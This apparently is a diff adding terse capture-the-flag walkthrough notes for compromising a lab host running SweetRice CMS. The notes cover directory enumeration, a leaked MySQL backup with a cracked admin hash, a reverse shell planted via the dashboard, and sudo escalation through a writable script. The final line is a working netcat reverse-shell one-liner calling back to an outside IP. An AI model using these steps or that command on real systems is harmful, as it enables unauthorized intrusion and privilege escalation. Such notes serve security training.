@@ -1,0 +1,48 @@
+Nmap:
+
+22 - ssh
+80 - http, ubuntu
+
+Gobuster:
+
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/content              (Status: 301) [Size: 316] [--> http://10.10.111.246/content/]
+/index.html           (Status: 200) [Size: 11321]
+/server-status        (Status: 403) [Size: 278]
+
+
+Content - SweetRice
+
+Additionally scan /content/
+
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/_themes              (Status: 301) [Size: 324] [--> http://10.10.111.246/content/_themes/]
+/as                   (Status: 301) [Size: 319] [--> http://10.10.111.246/content/as/]
+/attachment           (Status: 301) [Size: 327] [--> http://10.10.111.246/content/attachment/]
+/images               (Status: 301) [Size: 323] [--> http://10.10.111.246/content/images/]
+/inc                  (Status: 301) [Size: 320] [--> http://10.10.111.246/content/inc/]
+/index.php            (Status: 200) [Size: 2199]
+/js                   (Status: 301) [Size: 319] [--> http://10.10.111.246/content/js/]
+
+Got mysql backups at /content/inc/mysql_backup/
+
+s:5:\"admin\";s:7:\"manager\";s:6:\"passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb\"
+
+manager 42f749ade7f9e195bf475f37a44cafcb (md5 hash) -> Password123
+
+Adding rev_shell as ads in dashboard
+
+mysql_login.txt
+
+rice:randompass
+
+sudo -l 
+NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+backup.pl shows /etc/copy.sh, which we can write to
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.245.173 8889 >/tmp/f
